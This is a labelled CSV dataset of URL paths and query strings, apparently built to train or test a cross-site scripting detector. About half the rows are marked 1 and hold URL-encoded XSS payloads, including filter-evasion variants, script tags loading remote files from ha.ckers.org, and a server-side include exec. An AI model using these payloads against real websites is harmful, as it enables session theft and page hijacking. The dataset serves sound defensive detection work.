text,label
/3843?alter=alter,0
/biancuzzi?allow=allow,0
/budgeting?startyear=startyear,0
/000326?groupname=groupname,0
/72915?newX10Monitor=%3Cmarquee%20onstart%3D%27javascript%3Aalert%26%23x28%3B1%26%23x29%3B%27%3E%5E__%5E,1
/taps?defaults=%3Ciframe%20src%20iframe%20src%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/iframe%20src%3E,1
/002290?enclose=enclose,0
/t-shirts?removeheader=%26%23x0003c,1
/28264?fvonly=fvonly,0
/1054?oof=%3Cdiv/style%3D%22width%3Aexpression%28confirm%281%29%29%22%3EX%3C/div%3E%20%7BIE7%7D,1
/68276?imageid=imageid,0
/20061212-8407?hideidentity=hideidentity,0
/online-banking?dB=dB,0
/sniff?up=up,0
/a003cont?frontend=%3Cimg%20src%3D%22blah%22onmouseover%3D%22document.vulnerable%3Dtrue%3B%22%3E,1
/teal?sa=%3Ca%20href%3D%22%5Cx1Bjavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/1000137?SMALLER=%27%22%3E%3C/title%3E%3Cscript%3Ealert%281111%29%3C/script%3E,1
/74118?actionType=actionType,0
/m26?recordSep=recordSep,0
/G-Tune_v2?hidemenu=hidemenu,0
/6736?disablelargereceiveoffloading=%3Cimg%20src%5Cx47%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/3202?cleancache=cleancache,0
/hangover?searchQuery=searchQuery,0
/2200?wins1=wins1,0
/24277?articleid=%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20aaaaaaaaa%20aaaaaaaaaa%20href%3Dj%26%2397v%26%2397script%26%23x3A%3B%26%2397lert%281%29%3EClickMe,1
/2744?jufinal=%3C%21--%23exec%20cmd%3D%22/bin/echo%20%27%3CSCR%27%22--%3E%3C%21--%23exec%20cmd%3D%22/bin/echo%20%27IPT%20SRC%3Dhttp%3A//www.securitycompass.com/xss.js%3E%3C/SCRIPT%3E%27%22--%3E,1
/counterterrorism?google=google,0
/74259?filename2=filename2,0
/laser?gids=%3CXML%20ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5B%3CIMG%20SRC%3D%22javas%5D%5D%3C%21%5Bcript%3Adocument.vulnerable%3Dtrue%3B%22%3E%5D%5D%3C/C%3E%3C/X%3E%3C/xml%3E%3CSPAN%20DATASRC%3D%23I%20DATAFLD%3DC%20DATAFORMATAS%3DHTML%3E%3C/span%3E,1
/atms?memberPasswd2=%3Cimage%20src/onerror%3Dprompt%288%29%3E,1
/jin?magicfields=magicfields,0
/1733?gift=gift,0
/text4?namelist=%3CIMGSRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%3CWBR%3E%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%3CWBR%3E%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%3CWBR%3E%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E,1
/121742?stamp=%3Clink%20rel%3Dstylesheet%20href%3Ddata%3A%2C%2A%257bx%3Aexpression%28javascript%3Aalert%281%29%29%257d,1
/Terrorism?familyName=%3CIMG%20SRC%3Djavascript%3Ajavascript%3Aalert%281%29%3E,1
/porting?plus=plus,0
/2472?bcip=bcip,0
/writeforus?other=other,0
/category1?pUID=pUID,0
/estonia?player=player,0
/slide_11?dximg=%3Ca%20href%3D%22%5CxE2%5Cx80%5Cx85javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/flashback?trash=trash,0
/terrorists?rssmaxitems=rssmaxitems,0
/18746?shout=shout,0
/36155?newtheme=newtheme,0
/last-added?pdouser=%3C%3BA%20HREF%3D%22%3Bhttp%3A//www.google.com./%22%3B%3E%3BXSS%3C%3B/A%3E%3B,1
/interviewpages?adminUser=adminUser,0
/scary?extAction=extAction,0
/Full_Coverage?newWindow=%3C~/XSS%20STYLE%3Dxss%3Aexpression%28alert%28%27XSS%27%29%29%3E,1
/11401?album=album,0
/macxtigermm?d1=d1,0
/myaol_cta1?ftppass=ftppass,0
/sonic?telephone=telephone,0
/002132?container=%22%3E%3Ch1%3E%3CIFRAME%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C/IFRAME%3E%22%3E123%3C/h1%3E,1
/developmenttopics?enhanced=enhanced,0
/Contact_us?Menu=%3Ca%20href%3D%22%5Cx13javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/grp?browse=browse,0
/internationalization?medalid=%3Cimg%20src%3D%60xx%3Axx%60onerror%3Dalert%281%29%3E,1
/Icon-Tools?preset=%3Cimg/src%3D%40%26%2332%3B%26%2313%3B%20onerror%20%3D%20prompt%28%27%26%2349%3B%27%29,1
/scummvm?password=password,0
/cc50?cluster=cluster,0
/2325?url2=%3C%3BSCRIPT%20SRC%3Dhttp%3A//ha.ckers.org/xss.js,1
/textonly?cracK=cracK,0
/electromenager?analyze=analyze,0
/37862?submit3=%3Cimg%20src%5Cx00%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/8112?dstbeginport=dstbeginport,0
/pgnext?paths=paths,0
/expert?cdone=%22%60%27%3E%3Cscript%3E%5CxF0%5Cx90%5Cx96%5Cx9Ajavascript%3Aalert%281%29%3C/script%3E,1
/execs?messageMultiplier=messageMultiplier,0
/24394?mapping=mapping,0
/28038346?more=more,0
/1106?skip=%26lt%3BXML%20ID%3D%26quot%3Bxss%26quot%3B%26gt%3B%26lt%3BI%26gt%3B%26lt%3BB%26gt%3B%26lt%3BIMG%20SRC%3D%26quot%3Bjavas%26lt%3B%21--%20--%26gt%3Bcript%3Aalert%28%26apos%3BXSS%26apos%3B%29%26quot%3B%26gt%3B%26lt%3B/B%26gt%3B%26lt%3B/I%26gt%3B%26lt%3B/XML%26gt%3B,1
/box_lt?birthday=%3CP%20STYLE%3D%22behavior%3Aurl%28%27%23default%23time2%27%29%22%20end%3D%220%22%20onEnd%3D%22javascript%3Aalert%281%29%22%3E,1
/23488?tt=tt,0
/footerleft?done=done,0
/book-img?nn=nn,0
/5034?deletefolder=eval%28a%2Bb%2Bc%2Bd%29%3B,1
/ws2c?u42=u42,0
/member_locked?nID=%22%3E%3Ch1%3E%3CIFRAME%20SRC%3D%23%20onmouseover%3D%22alert%28document.cookie%29%22%3E%3C/IFRAME%3E123%3C/h1%3E,1
/coffeecat?extMethod=%3Ciframe/onreadystatechange%3Dalert%281%29,1
/20534?properties=%3Cimg/src%3D%40%26%2332%3B%26%2313%3B%20onerror%20%3D%20prompt%28%27%26%2349%3B%27%29,1
/8113?attachid=attachid,0
/wbl?uploadloc=%3CIMG%20SRC%3Dx%20onloadedmetadata%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/meyers?localip=localip,0
/speedtest?redfi=redfi,0
/loadbalancer?exportFile=%3Cembed%20src%3D%22data%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%3E,1
/20040902?inputSize=inputSize,0
/wwe?autoassign=autoassign,0
/40219?defaultleasetime=defaultleasetime,0
/d9c2fe33?srcport=%22%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%28%28%27A%27%29%29%3E,1
/perldelta?u18=u18,0
/articlelist?static=%3Cscript%3E%28%7B0%3A%230%3Dalert/%230%23/%230%23%280%29%7D%29%3C/script%3E,1
/m3?why=%3Cscript%3E%28%7B0%3A%230%3Deval/%230%23/%230%23%28javascript%3Aalert%281%29%29%7D%29%3C/script%3E,1
/101887?post2=post2,0
/edt?utmdebug=utmdebug,0
/ec2006?pass=%3Cimg%20src%5Cx11%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/exploits50?ppsflag2=ppsflag2,0
/swlogo?actpass=%3CIMG%20SRC%3Dx%20onload%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/asiaweek?UserRecoveryForm=%3CIFRAME%20SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C/IFRAME%3E,1
/vintage?numlabel=numlabel,0
/utk?exception=exception,0
/49366?withdraw=%3Cstyle%3E%2A%7Bx%3A%EF%BD%85%EF%BD%98%EF%BD%90%EF%BD%92%EF%BD%85%EF%BD%93%EF%BD%93%EF%BD%89%EF%BD%8F%EF%BD%8E%28javascript%3Aalert%281%29%29%7D%3C/style%3E,1
/Happy?imageUrl=imageUrl,0
/41873?Tag=Tag,0
/resource?initial=%3C~/XSS/%2A-%2A/STYLE%3Dxss%3Ae/%2A%2A/xpression%28alert%28%27XSS%27%29%29%3E,1
/chap13?minor=%26lt%3BLINK%20REL%3D%26quot%3Bstylesheet%26quot%3B%20HREF%3D%26quot%3Bhttp%3A//ha.ckers.org/xss.css%26quot%3B%26gt%3B,1
/000045?tableName=%3Capplet%20onError%20applet%20onError%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/applet%20onError%3E,1
/9469?ident=ident,0
/cswift?id25gid=%26LT%3B,1
/82482?vuln=%3Ciframe/src%20%5C/%5C/onload%20%3D%20prompt%281%29,1
/coolfm?extra=extra,0
/training_brochure?nowarned=nowarned,0
/rig?itemStatusID=%26lt%3BSCRIPT%20a%3D%26quot%3B%3E%26apos%3B%3E%26quot%3B%20SRC%3D%26quot%3Bhttp%3A//ha.ckers.org/xss.js%26quot%3B%26gt%3B%26lt%3B/SCRIPT%26gt%3B,1
/antispam?utm_content=%3C%3BA%20HREF%3D%22%3Bhttp%3A//1113982867/%22%3B%3E%3BXSS%3C%3B/A%3E%3B,1
/151096?reserveItemID=reserveItemID,0
/getopn?referral=%3Cimg%20src%3D%60%2500%60%26NewLine%3B%20onerror%3Dalert%281%29%26NewLine%3B,1
/classified-careerbuilder?IGNOREFIRST=IGNOREFIRST,0
/2000-09?WSDL=%22%60%27%3E%3Cscript%3E%5CxEF%5CxBB%5CxBFjavascript%3Aalert%281%29%3C/script%3E,1
/HTML_Crypt?blogtitle=%3Cembed%20width%3D500%20height%3D500%20code%3D%22data%3Atext/html%2C%3Cscript%3E%25%28payload%29s%3C/script%3E%22%3E%3C/embed%3E,1
/engl?recurring=recurring,0
/5997?mito=mito,0
/001805?entryId=%3Cbody%20onload%3D%22document.vulnerable%3Dtrue%3B%22%3E,1
/image1?domaiN=domaiN,0
/base?SHIPTOSTREET2=%3CHEAD%3E%3CMETA%20HTTP-EQUIV%3D%22CONTENT-TYPE%22%20CONTENT%3D%22text/html%3B%20charset%3DUTF-7%22%3E%20%3C/HEAD%3E%2BADw-SCRIPT%2BAD4-%25%28payload%29s%3B%2BADw-/SCRIPT%2BAD4-,1
/42776?ipsecpsk=%22%60%27%3E%3Cscript%3E%5Cx00javascript%3Aalert%281%29%3C/script%3E,1
/7347?folderId=folderId,0
/N-rec_1?queryString=%3C%3BHTML%3E%3B%3C%3BBODY%3E%3B,1
/Containers?adminpass2=%26%230060,1
/653?decrypt=%3CBODY%20ONLOAD%3Djavascript%3Aalert%281%29%3E,1
/uspis?reportView=reportView,0
/albuquerque?userName=%3CXSS%20STYLE%3D%22xss%3Aexpression%28javascript%3Aalert%281%29%29%22%3E,1
/bricklittlescreen?related=related,0
/faq_off?welcome=welcome,0
/001204?gold=gold,0
/0628?minage=%3Cobject%20classid%3D%22clsid%3A...%22%20codebase%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/fridge?UserChangePassword=UserChangePassword,0
/0321240693?thumbnails=thumbnails,0
/dinah?subset=%3CIMG%20SRC%3D%20onmouseover%3D%22alert%28%27xxs%27%29%22%3E,1
/button_sections?subqcmnds=%3C~/XSS/%2A-%2A/STYLE%3Dxss%3Ae/%2A%2A/xpression%28alert%28%27XSS%27%29%29%3E,1
/guidant?convertmode=convertmode,0
/omf?tpl=tpl,0
/reportuce?displayAllColumns=%3CIMG%20DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,1
/scan_detect?calendarid=calendarid,0
/button-xhtml?show=%3Ca%20href%3D%22%5Cx0Fjavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/82372?newemail=%3Cform%20id%3D%22test%22%20/%3E%3Cbutton%20form%3D%22test%22%20formaction%3D%22javascript%3Aalert%28123%29%22%3ETESTHTML5FORMACTION,1
/content-negotiation?locations=%3Cxml%20onPropertyChange%20xml%20onPropertyChange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/xml%20onPropertyChange%3E,1
/animate?extdisplay=%3Ca%20href%3D%22data%3Atext/html%3Bbase64_%2C%3Csvg/onload%3D%5Cu0061%26%23x6C%3B%26%23101%2572t%281%29%3E%22%3EX%3C/a,1
/242853?canpreview=%3C%3BSCRIPT%20SRC%3D//ha.ckers.org/.j%3E%3B,1
/34140?inventoryCode=inventoryCode,0
/mescustomers?relevance=relevance,0
/15371?phpinfo=%3C%3BA%20HREF%3D%22%3Bhttp%3A//www.google.com./%22%3B%3E%3BXSS%3C%3B/A%3E%3B,1
/ups?dhcp6usev4iface=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx2Fonerror%3Djavascript%3Aalert%281%29%3E,1
/tenders?lname=%3Cscript%3E%25%28payload%29s%3C/script%3E,1
/0596004567?characterid=%3Cdiv%20id%3Dd%3E%3Cdiv%20style%3D%22font-family%3A%27sans%5C27%5C3B%20color%5C3Ared%5C3B%27%22%3EX%3C/div%3E%3C/div%3E%20%3Cscript%3Ewith%28document.getElementById%28%22d%22%29%29innerHTML%3DinnerHTML%3C/script%3E,1
/9723?perms9=%3Cstyle%3E%2A%5B%7B%7D%40import%27%25%28css%29s%3F%5D%3C/style%3EX,1
/short?submitrobots=submitrobots,0
/vendors?concepto=%3Cdiv%20id%3D%22x%22%3Ex%3C/div%3E%20%3Cxml%3Anamespace%20prefix%3D%22t%22%3E%20%3Cimport%20namespace%3D%22t%22%20implementation%3D%22%23default%23time2%22%3E%20%3Ct%3Aset%20attributeName%3D%22innerHTML%22%20targetElement%3D%22x%22%20to%3D%22%26lt%3Bimg%26%2311%3Bsrc%3Dx%3Ax%26%2311%3Bonerror%26%2311%3B%3Djavascript%3Aalert%281%29%26gt%3B%22%3E,1
/12488?vpassword=%3CSCRIPT/SRC%3D%22%25%28jscript%29s%22%3E%3C/SCRIPT%3E,1
/17991?deleteip=%3Cscript%20onLoad%20script%20onLoad%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/script%20onLoad%3E,1
/home_tagline?bv=bv,0
/cyber_security?xhprof=xhprof,0
/gsasl?passwd2=passwd2,0
/195154_1?srv=%3Ca%20href%3D%22%5Cx20javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/7913?usetoken=usetoken,0
/c_13?string=string,0
/newsl?mg=%3C%3BSTYLE%20type%3D%22%3Btext/css%22%3B%3E%3BBODY%7Bbackground%3Aurl%28%22%3Bjavascript%3Aalert%28%27%3BXSS%27%3B%29%22%3B%29%7D%3C%3B/STYLE%3E%3B,1
/voter?proxyuser=proxyuser,0
/29327?bfirstname=%3Cmath%3E%3Ca%20xlink%3Ahref%3D%22//jsfiddle.net/t846h/%22%3Eclick,1
/Marketplace?baddress2=baddress2,0
/free-download?patch=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C/SCRIPT%3EPT%20SRC%3D%22http%3A//ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E,1
/125989?fmt=fmt,0
/lanflow?sf=%3Cbody%20onscroll%3Djavascript%3Aalert%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E,1
/6629?edittxt=%26lt%3B%3F%20echo%28%26apos%3B%26lt%3BSCR%29%26apos%3B%3B,1
/10384?ue=ue,0
/disable?allids=allids,0
/arrow_right?languages=%3CIMG%20onmouseover%3D%22alert%28%27xxs%27%29%22%3E,1
/studios?processlist=processlist,0
/psf?startday=startday,0
/AT?dxmode=%3Cobject%20data%3D%22http%3A//corkami.googlecode.com/svn/%21svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf%22%3E,1
/23240?useR=useR,0
/smallmedoffice?custom=%3Ciframe%20src%3D%22vbscript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/23060?hidid=hidid,0
/I18N?menuid=menuid,0
/mailbox?TITL=TITL,0
/Ethics?suspend=suspend,0
/zenv?coupon=%3CDIV%20STYLE%3D%22background-image%3A%20url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E,1
/19020?rollback=rollback,0
/Taxonomy?mkfile=mkfile,0
